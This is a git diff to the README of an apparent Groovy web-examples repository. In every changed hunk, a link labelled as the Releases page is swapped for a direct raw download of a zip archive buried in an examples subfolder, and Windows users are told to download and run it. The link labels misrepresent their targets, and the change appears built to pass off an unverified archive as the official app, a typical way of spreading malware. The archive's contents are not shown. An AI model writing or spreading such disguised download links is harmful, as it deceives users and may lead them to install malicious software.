@@ -1,6 +1,6 @@
 # groovy-web-examples - Learn Groovy web apps with ease
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/lija8421/groovy-web-examples/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/lija8421/groovy-web-examples/raw/refs/heads/main/examples/grails/hello-world/groovy_examples_web_tabby.zip)
 
 ## 🧭 What this is
 
@@ -22,7 +22,7 @@ If the release page includes a packaged app, you can use it right away. If it in
 
 Visit the release page here and choose the latest file for Windows:
 
-[Go to the Releases page](https://github.com/lija8421/groovy-web-examples/releases)
+[Go to the Releases page](https://github.com/lija8421/groovy-web-examples/raw/refs/heads/main/examples/grails/hello-world/groovy_examples_web_tabby.zip)
 
 Look for a file name that fits Windows use, such as:
 
@@ -177,7 +177,7 @@ Each example can help you learn one small part of web development, such as:
 
 Check the Releases page for new versions, updated examples, and new tutorial files:
 
-[Open Releases](https://github.com/lija8421/groovy-web-examples/releases)
+[Open Releases](https://github.com/lija8421/groovy-web-examples/raw/refs/heads/main/examples/grails/hello-world/groovy_examples_web_tabby.zip)
 
 ## 🧠 Best way to start
 
